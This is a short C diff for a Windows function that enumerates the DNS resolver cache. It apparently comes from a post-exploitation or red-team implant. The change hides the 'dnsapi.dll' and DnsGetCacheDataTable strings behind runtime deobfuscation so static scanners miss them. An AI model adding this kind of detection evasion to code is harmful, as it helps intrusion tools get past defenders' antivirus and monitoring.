@@ -317,11 +317,13 @@ int net_enum_dns_cache(unsigned char *outBuf, DWORD outBufSize, DWORD *bytesWrit
 
     _append(outBuf, outBufSize, &off, "HOSTNAME\tTYPE\tDATA_LEN\n");
 
-    HMODULE hDns = LoadLibraryW(L"dnsapi.dll");
+    char _nd[] = S_DNSAPI_DLL; _DEOBF(_nd);
+    HMODULE hDns = LoadLibraryA(_nd);
     if (!hDns) { *bytesWritten = off; return 0; }
 
+    char _nf[] = S_DnsGetCacheDataTable; _DEOBF(_nf);
     fn_DnsGetCacheDataTable pDnsGetCache =
-        (fn_DnsGetCacheDataTable)GetProcAddress(hDns, "DnsGetCacheDataTable");
+        (fn_DnsGetCacheDataTable)GetProcAddress(hDns, _nf);
     if (!pDnsGetCache) {
         FreeLibrary(hDns);
         *bytesWritten = off;
